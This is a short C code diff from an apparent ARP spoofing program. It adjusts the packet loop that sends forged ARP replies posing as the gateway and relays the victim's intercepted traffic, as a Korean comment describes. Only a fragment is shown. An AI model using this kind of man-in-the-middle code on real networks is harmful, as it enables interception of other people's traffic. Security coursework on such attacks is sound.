@@ -63,8 +63,8 @@ int main(int argc, char* argv[]){
 	double gap = 0;
 	time(&start);
 	
+	int ispacket = 0;
 	while(1){
-		int ispacket = 0;
 		ispacket = pcap_next_ex(pcd, &pkthdr, &packet);
 		if(ispacket < 0){
 			printf("packet_next error\n");
@@ -80,14 +80,14 @@ int main(int argc, char* argv[]){
 			printf("time expired\n");
 		}
 
-		if( ( isbroadcast(packet, GWIp) ) || ( isbroadcast(packet, victimIp) ) ) {
+		if(( isbroadcast(packet, victimIp) ) ) {
 			//sleep(1);	// after sender get the reply from the GW
 			ARPreply(victimMac, victimIp, myMac, GWIp, pcd);
 			//ARPreply(GWMac, GWIp, myMac, victimIp, pcd);
 		}
 
 		//victim->GW가 있으면 잡기. 만약 잡히면 수정해서(source mac) relay
-		pcap_from_victiom(victimIp, GWIp, GWMac, myMac, device, pcd, pkthdr, packet);
+		pcap_from_victiom(&victimIp, &GWIp, &GWMac, &myMac, device, pcd, pkthdr, packet);
 		//pcap_from_victiom(GWIp, victimIp, victimMac, device, pcd, packet);
 	}
 	pcap_close(pcd);
